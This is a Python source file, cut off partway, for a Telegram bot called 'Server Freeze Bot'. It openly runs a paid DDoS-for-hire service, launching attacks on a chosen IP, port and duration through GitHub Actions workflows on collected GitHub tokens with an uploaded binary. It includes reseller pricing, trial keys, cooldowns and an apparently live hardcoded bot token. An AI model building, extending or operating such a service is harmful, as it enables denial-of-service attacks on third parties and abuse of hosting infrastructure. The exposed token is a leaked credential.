import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_IP = 1
WAITING_FOR_PORT = 2
WAITING_FOR_TIME = 3
WAITING_FOR_BINARY = 4
WAITING_FOR_BROADCAST = 5
WAITING_FOR_USER_ID = 6
WAITING_FOR_DAYS = 7
WAITING_FOR_TOKEN = 8
WAITING_FOR_OWNER_ID = 9
WAITING_FOR_OWNER_USERNAME = 10
WAITING_FOR_RESELLER_ID = 11
WAITING_FOR_RESELLER_CREDITS = 12
WAITING_FOR_RESELLER_USERNAME = 13
WAITING_FOR_REMOVE_ID = 14
WAITING_FOR_COOLDOWN = 15
WAITING_FOR_MAX_ATTACKS = 16
WAITING_FOR_TRIAL_HOURS = 17
WAITING_FOR_REDEEM_KEY = 18

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
user_states = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f, indent=2)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {"current_attack": current_attack, "cooldown_until": cooldown_until}
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

users = load_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
resellers = load_resellers()
github_tokens = load_github_tokens()
trial_keys = load_trial_keys()
groups = load_groups()

MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

logger.info("✅ Part 1: Configurations loaded")

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    if str(user_id) not in approved_users:
        return False
    user_data = approved_users[str(user_id)]
    expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiry_date:
        return False
    return True

def has_access(user_id):
    return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)

def generate_trial_key(hours):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    expiry = datetime.now() + timedelta(hours=hours)
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"),
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "used": False
    }
    save_trial_keys(trial_keys)
    return key

def create_repository(token, repo_name):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except:
            repo = user.create_repo(repo_name, private=False)
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {str(e)}")

def format_time_remaining(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        remaining = expiry - datetime.now()
        if remaining.total_seconds() <= 0:
            return "Expired"
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"
    except:
        return "Unknown"

def get_main_menu_keyboard(user_id):
    keyboard = []
    if is_owner(user_id):
        keyboard.extend([
            [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 Bot Statistics", callback_data="statistics")],
            [InlineKeyboardButton("⚙️ Bot Settings", callback_data="settings")]
        ])
    elif is_admin(user_id):
        keyboard.extend([
            [InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 My Statistics", callback_data="statistics")]
        ])
    elif is_reseller(user_id):
        keyboard.extend([
            [InlineKeyboardButton("💰 Reseller Panel", callback_data="reseller_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 My Account", callback_data="my_account")]
        ])
    elif is_approved_user(user_id):
        keyboard.extend([
            [InlineKeyboardButton("⚔️ Launch Attack", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 My Account", callback_data="my_account")],
            [InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")]
        ])
    else:
        keyboard.extend([
            [InlineKeyboardButton("📝 Request Access", callback_data="request_access")],
            [InlineKeyboardButton("🎁 Redeem Trial Key", callback_data="redeem_key")],
            [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/YourOwnerUsername")]
        ])
    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
    return InlineKeyboardMarkup(keyboard)

def get_owner_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="owner_users")],
        [InlineKeyboardButton("🛡️ Admin Management", callback_data="owner_admins")],
        [InlineKeyboardButton("💰 Reseller Management", callback_data="owner_resellers")],
        [InlineKeyboardButton("🔑 Server Management", callback_data="owner_servers")],
        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="owner_broadcast")],
        [InlineKeyboardButton("⚙️ System Settings", callback_data="owner_settings")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
        [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="admin_genkey")],
        [InlineKeyboardButton("📊 View Statistics", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_reseller_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="reseller_add")],
        [InlineKeyboardButton("➖ Remove User", callback_data="reseller_remove")],
        [InlineKeyboardButton("📋 My Users", callback_data="reseller_myusers")],
        [InlineKeyboardButton("💳 My Credits", callback_data="reseller_credits")],
        [InlineKeyboardButton("💰 Price List", callback_data="reseller_prices")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_attack_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Attack", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Check Status", callback_data="attack_status")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
        [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("📋 User List", callback_data="list_users")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("📋 Admin List", callback_data="list_admins")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_reseller_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller")],
        [InlineKeyboardButton("➖ Remove Reseller", callback_data="remove_reseller")],
        [InlineKeyboardButton("💳 Add Credits", callback_data="add_reseller_credits")],
        [InlineKeyboardButton("📋 Reseller List", callback_data="list_resellers")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_server_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Server", callback_data="add_server")],
        [InlineKeyboardButton("➖ Remove Server", callback_data="remove_server")],
        [InlineKeyboardButton("📋 Server List", callback_data="list_servers")],
        [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_settings_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown")],
        [InlineKeyboardButton("🎯 Set Max Attacks", callback_data="set_max_attacks")],
        [InlineKeyboardButton("🔧 Toggle Maintenance", callback_data="toggle_maintenance")],
        [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="gen_trial_key")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_pending_action_keyboard(user_id):
    keyboard = [
        [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")],
        [InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")],
        [InlineKeyboardButton("🔙 Back", callback_data="pending_requests")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    return InlineKeyboardMarkup(keyboard)

logger.info("✅ Part 2: Helper functions loaded")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    welcome_text = f"""
🤖 **WELCOME TO SERVER FREEZE BOT**

👋 Hello @{username}!
🆔 Your ID: `{user_id}`

"""
    
    if is_owner(user_id):
        welcome_text += "👑 **Your Role**: OWNER\n✅ **Access**: Full Control\n"
    elif is_admin(user_id):
        welcome_text += "🛡️ **Your Role**: ADMIN\n✅ **Access**: User Management\n"
    elif is_reseller(user_id):
        welcome_text += "💰 **Your Role**: RESELLER\n✅ **Access**: Add Users\n"
    elif is_approved_user(user_id):
        user_data = approved_users[str(user_id)]
        remaining = format_time_remaining(user_data['expiry_date'])
        welcome_text += f"✅ **Your Status**: APPROVED\n⏰ **Time Left**: {remaining}\n"
    else:
        welcome_text += "❌ **Status**: UNAUTHORIZED\n💡 **Tip**: Request access or redeem a key\n"
    
    welcome_text += "\n🎯 **Select an option below:**"
    
    keyboard = get_main_menu_keyboard(user_id)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
ℹ️ **BOT HELP & COMMANDS**

**🎯 Main Features:**
• 🚀 Launch DDoS attacks via GitHub Actions
• ⏱️ Configurable cooldown & attack limits
• 👥 Multi-level user management system
• 💰 Reseller system with credit management
• 🎁 Trial key generation & redemption

**📱 Button Interface:**
Use the buttons below each message to navigate easily!

**⌨️ Quick Commands:**
/start - Main menu
/id - Get your user ID
/myaccess - Check your access level
/status - View attack status
/stop - Stop active attack
/redeem <KEY> - Redeem trial key

**👑 Owner Commands:**
/addtoken <token> - Add GitHub server
/removetoken <number> - Remove server
/tokens - List all servers
/binary_upload - Upload binary file
/broadcast - Send broadcast message

**🆘 Need Help?**
Contact the bot owner for assistance!
"""
    
    keyboard = get_back_keyboard()
    
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode='Markdown')

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    
    id_text = f"""
🆔 **YOUR INFORMATION**

👤 Username: @{username}
🔢 User ID: `{user_id}`
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

💡 Send this ID to the owner to get access!
"""
    
    await update.message.reply_text(id_text, parse_mode='Markdown')

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    access_text = "📊 **YOUR ACCESS STATUS**\n\n"
    
    if is_owner(user_id):
        owner_data = owners[str(user_id)]
        access_text += f"""
👑 **Role**: OWNER
✅ **Access**: Full Control
📅 **Added**: {owner_data.get('added_date', 'N/A')}
🔑 **Type**: {'Primary' if owner_data.get('is_primary') else 'Secondary'}
"""
    elif is_admin(user_id):
        admin_data = admins[str(user_id)]
        access_text += f"""
🛡️ **Role**: ADMIN
✅ **Access**: User Management
📅 **Added**: {admin_data.get('added_date', 'N/A')}
"""
    elif is_reseller(user_id):
        reseller_data = resellers[str(user_id)]
        credits = reseller_data.get('credits', 0)
        access_text += f"""
💰 **Role**: RESELLER
💳 **Credits**: {credits} days
📅 **Added**: {reseller_data.get('added_date', 'N/A')}
👥 **Users Added**: {reseller_data.get('users_added', 0)}
"""
    elif is_approved_user(user_id):
        user_data = approved_users[str(user_id)]
        expiry = user_data['expiry_date']
        remaining = format_time_remaining(expiry)
        access_text += f"""
✅ **Role**: APPROVED USER
⏰ **Time Remaining**: {remaining}
📅 **Expiry Date**: {expiry}
👤 **Added By**: {user_data.get('added_by', 'Unknown')}
"""
    else:
        access_text += """
❌ **Status**: UNAUTHORIZED

You don't have access to use this bot.
Please:
1️⃣ Request access from admin
2️⃣ Redeem a trial key
3️⃣ Contact a reseller
"""
    
    keyboard = get_back_keyboard()
    await update.message.reply_text(access_text, reply_markup=keyboard, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    
    status_text = "📊 **ATTACK STATUS**\n\n"
    
    if MAINTENANCE_MODE:
        status_text += "🔧 **Maintenance Mode**: ON\n"
        status_text += "⚠️ All attacks are currently disabled.\n"
    elif current_attack:
        status_text += f"""🚀 **Status**: ACTIVE ATTACK
🎯 **Target**: `{current_attack.get('target', 'N/A')}`
🔌 **Port**: `{current_attack.get('port', 'N/A')}`
⏱️ **Duration**: `{current_attack.get('time', 'N/A')}s`
👤 **Started By**: @{current_attack.get('user', 'Unknown')}
⏰ **Started At**: `{current_attack.get('start_time', 'N/A')}`
"""
    elif cooldown_until > time.time():
        remaining_cooldown = int(cooldown_until - time.time())
        status_text += f"""⏳ **Status**: COOLDOWN PERIOD
⏱️ **Wait Time**: `{remaining_cooldown}s`
💡 Please wait before next attack
"""
    else:
        status_text += """✅ **Status**: READY TO ATTACK
🎯 All systems operational!
🚀 Ready to launch attack
"""
    
    status_text += f"\n⚙️ **Server Configuration**:\n"
    status_text += f"🔑 **Active Servers**: `{len(github_tokens)}`\n"
    status_text += f"⏳ **Cooldown Duration**: `{COOLDOWN_DURATION}s`\n"
    status_text += f"🎯 **Max Attacks Limit**: `{MAX_ATTACKS}`\n"
    
    keyboard = get_back_keyboard()
    
    if update.callback_query:
        await update.callback_query.edit_message_text(status_text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(status_text, reply_markup=keyboard, parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack
    user_id = update.effective_user.id
    
    if not has_access(user_id):
        await update.message.reply_text("❌ ACCESS DENIED")
        return
    
    if not current_attack:
        await update.message.reply_text("⚠️ No active attack to stop.")
        return
    
    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
        await update.message.reply_text("❌ You can only stop your own attacks!")
        return
    
    current_attack = None
    save_attack_state()
    
    await update.message.reply_text("✅ **ATTACK STOPPED**\n\nThe current attack has been terminated.", parse_mode='Markdown')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Invalid syntax**\n\n"
            "Usage: `/redeem <KEY>`\n"
            "Example: `/redeem ABCD1234EFGH`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0].upper()
    
    if key not in trial_keys:
        await update.message.reply_text("❌ Invalid trial key!")
        return
    
    key_data = trial_keys[key]
    
    if key_data.get('used'):
        await update.message.reply_text("❌ This key has already been used!")
        return
    
    expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiry:
        await update.message.reply_text("❌ This key has expired!")
        return
    
    hours = key_data['hours']
    new_expiry = datetime.now() + timedelta(hours=hours)
    
    approved_users[str(user_id)] = {
        "username": update.effective_user.username or f"user_{user_id}",
        "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
        "added_by": "trial_key",
        "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "plan": f"{hours}h trial"
    }
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    save_approved_users(approved_users)
    save_trial_keys(trial_keys)
    
    success_text = f"""
✅ **TRIAL KEY ACTIVATED!**

🎁 Duration: {hours} hours
⏰ Valid Until: {new_expiry.strftime("%Y-%m-%d %H:%M:%S")}

You now have access to the bot! 🎉
Use /start to begin.
"""
    
    await update.message.reply_text(success_text, parse_mode='Markdown')

logger.info("✅ Part 3: Command handlers loaded")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
    
    elif data == "help":
        await help_command(update, context)
    
    elif data == "owner_panel":
        if not is_owner(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_owner_panel(query)
    
    elif data == "admin_panel":
        if not is_admin(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_admin_panel(query)
    
    elif data == "reseller_panel":
        if not is_reseller(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_reseller_panel(query)
    
    elif data == "attack_panel":
        if not has_access(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_attack_panel(query)
    
    elif data == "owner_users":
        await show_user_management(query)
    
    elif data == "owner_admins":
        await show_admin_management(query)
    
    elif data == "owner_resellers":
        await show_reseller_management(query)
    
    elif data == "owner_servers":
        await show_server_management(query)
    
    elif data == "pending_requests":
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_pending_requests(query)
    
    elif data == "owner_broadcast":
        await start_broadcast(query, user_id)
    
    elif data == "owner_settings" or data == "settings":
        await show_settings(query)
    
    elif data == "add_user":
        await init_add_user(query, user_id)
    
    elif data == "remove_user":
        await init_remove_user(query, user_id)
    
    elif data == "list_users":
        await show_users_list(query)
    
    elif data == "add_server":
        await init_add_server(query, user_id)
    
    elif data == "remove_server":
        await init_remove_server(query, user_id)
    
    elif data == "list_servers":
        await show_servers_list(query)
    
    elif data == "upload_binary":
        await init_upload_binary(query, user_id)
    
    elif data == "set_cooldown":
        await init_set_cooldown(query, user_id)
    
    elif data == "set_max_attacks":
        await init_set_max_attacks(query, user_id)
    
    elif data == "toggle_maintenance":
        await toggle_maintenance(query, user_id)
    
    elif data == "gen_trial_key" or data == "admin_genkey":
        await init_gen_trial_key(query, user_id)
    
    elif data == "start_attack":
        await init_attack(query, user_id)
    
    elif data == "stop_attack":
        await stop_attack_callback(query, user_id)
    
    elif data == "attack_status":
        await status_command(update, context)
    
    elif data == "statistics" or data == "admin_stats":
        await show_statistics(query)
    
    elif data == "my_account":
        await show_my_account(query, user_id)
    
    elif data == "reseller_add":
        await init_reseller_add_user(query, user_id)
    
    elif data == "reseller_remove":
        await init_reseller_remove_user(query, user_id)
    
    elif data == "reseller_myusers":
        await show_reseller_users(query, user_id)
    
    elif data == "reseller_credits":
        await show_reseller_credits(query, user_id)
    
    elif data == "reseller_prices":
        await show_reseller_prices(query)
    
    elif data == "request_access":
        await request_access(query, user_id)
    
    elif data == "redeem_key":
        await init_redeem_key(query, user_id)
    
    elif data.startswith("approve_"):
        req_user_id = int(data.split("_")[1])
        await approve_request(query, user_id, req_user_id)
    
    elif data.startswith("reject_"):
        req_user_id = int(data.split("_")[1])
        await reject_request(query, user_id, req_user_id)
    
    elif data == "add_admin":
        await init_add_admin(query, user_id)
    
    elif data == "remove_admin":
        await init_remove_admin(query, user_id)
    
    elif data == "list_admins":
        await show_admins_list(query)
    
    elif data == "add_reseller":
        await init_add_reseller(query, user_id)
    
    elif data == "remove_reseller":
        await init_remove_reseller(query, user_id)
    
    elif data == "add_reseller_credits":
        await init_add_reseller_credits(query, user_id)
    
    elif data == "list_resellers":
        await show_resellers_list(query)
    
    elif data == "cancel":
        user_states[user_id] = None
        await query.edit_message_text("❌ Operation cancelled.", reply_markup=get_back_keyboard())

async def show_owner_panel(query):
    text = f"""
👑 **OWNER PANEL**

Welcome to the owner control panel.
Select an option below to manage the bot.

🔑 Total Servers: {len(github_tokens)}
👥 Total Users: {len(approved_users)}
💰 Total Resellers: {len(resellers)}
🛡️ Total Admins: {len(admins)}
"""
    
    keyboard = get_owner_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_admin_panel(query):
    pending_count = len(load_pending_users())
    
    text = f"""
🛡️ **ADMIN PANEL**

Manage users and view statistics.

👥 Approved Users: {len(approved_users)}
📝 Pending Requests: {pending_count}
"""
    
    keyboard = get_admin_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_panel(query):
    user_id = query.from_user.id
    reseller_data = resellers[str(user_id)]
    
    text = f"""
💰 **RESELLER PANEL**

Welcome, {query.from_user.username or 'Reseller'}!

💳 Your Credits: {reseller_data.get('credits', 0)} days
👥 Users Added: {reseller_data.get('users_added', 0)}
📅 Member Since: {reseller_data.get('added_date', 'N/A')}
"""
    
    keyboard = get_reseller_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_attack_panel(query):
    global current_attack, cooldown_until
    
    text = "⚔️ **ATTACK PANEL**\n\n"
    
    if MAINTENANCE_MODE:
        text += "🔧 **Status**: Maintenance Mode\n"
        text += "All attacks are disabled.\n"
    elif current_attack:
        text += f"🚀 **Status**: Attack Running\n"
        text += f"🎯 Target: {current_attack.get('target')}\n"
        text += f"🔌 Port: {current_attack.get('port')}\n"
    elif cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        text += f"⏳ **Status**: Cooldown ({remaining}s)\n"
    else:
        text += "✅ **Status**: Ready\n"
    
    text += f"\n🔑 Active Servers: {len(github_tokens)}\n"
    
    keyboard = get_attack_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_user_management(query):
    text = """
👥 **USER MANAGEMENT**

Manage approved users and pending requests.

Select an action below:
"""
    
    keyboard = get_user_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_admin_management(query):
    text = f"""
🛡️ **ADMIN MANAGEMENT**

Total Admins: {len(admins)}

Admins can manage users and approve requests.
"""
    
    keyboard = get_admin_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_management(query):
    text = f"""
💰 **RESELLER MANAGEMENT**

Total Resellers: {len(resellers)}

Resellers can add users using their credits.
"""
    
    keyboard = get_reseller_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_server_management(query):
    text = f"""
🔑 **SERVER MANAGEMENT**

Total Servers: {len(github_tokens)}

Manage GitHub tokens and binary files.
"""
    
    keyboard = get_server_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_settings(query):
    text = f"""
⚙️ **SYSTEM SETTINGS**

⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
"""
    
    keyboard = get_settings_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_pending_requests(query):
    pending = load_pending_users()
    
    if not pending:
        text = "📭 **NO PENDING REQUESTS**\n\nAll requests have been processed."
        keyboard = get_back_keyboard()
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
        return
    
    text = "📝 **PENDING ACCESS REQUESTS**\n\n"
    
    for i, req in enumerate(pending[:10], 1):
        req_user_id = req['user_id']
        username = req.get('username', 'Unknown')
        date = req.get('date', 'N/A')
        text += f"{i}. 👤 @{username}\n"
        text += f"   🆔 ID: `{req_user_id}`\n"
        text += f"   📅 {date}\n\n"
    
    if len(pending) > 10:
        text += f"\n... and {len(pending) - 10} more requests"
    
    text += f"\n\n📊 Total Pending: {len(pending)}"
    text += "\n\n💡 Click on a request to approve/reject:"
    
    keyboard = []
    for req in pending[:10]:
        req_user_id = req['user_id']
        username = req.get('username', 'Unknown')[:15]
        keyboard.append([InlineKeyboardButton(f"👤 {username} - {req_user_id}", callback_data=f"view_req_{req_user_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="owner_panel" if is_owner(query.from_user.id) else "admin_panel")])
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def request_access(query, user_id):
    pending = load_pending_users()
    
    for req in pending:
        if req['user_id'] == user_id:
            await query.edit_message_text(
                "⚠️ **REQUEST ALREADY SENT**\n\n"
                "Your access request is pending approval.\n"
                "Please wait for an owner/admin to review it.",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            return
    
    if is_approved_user(user_id):
        await query.edit_message_text(
